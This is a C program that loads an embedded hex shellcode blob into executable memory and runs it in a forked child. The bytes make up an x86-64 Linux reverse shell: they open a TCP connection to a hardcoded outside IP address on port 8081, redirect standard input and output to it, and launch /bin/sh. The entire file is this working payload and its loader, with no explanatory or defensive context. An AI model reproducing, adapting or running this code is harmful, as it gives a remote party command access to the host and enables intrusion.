#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main() {
    // The shellcode to be injected
    char shellcode[] = {
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x1f\x91\x62\x46\x27\x68\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05"

    };

    // Allocate memory for the shellcode
    void *exec_mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // Copy the shellcode to the allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Create a child process
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        // Child process
        // Execute the shellcode
        int (*func)() = (int (*)())exec_mem;
        func();
        exit(EXIT_SUCCESS);
    } else {
        // Parent process
        // Wait for the child process to exit
        waitpid(pid, NULL, 0);

        // Free the allocated memory
        munmap(exec_mem, sizeof(shellcode));
    }

    return 0;
}
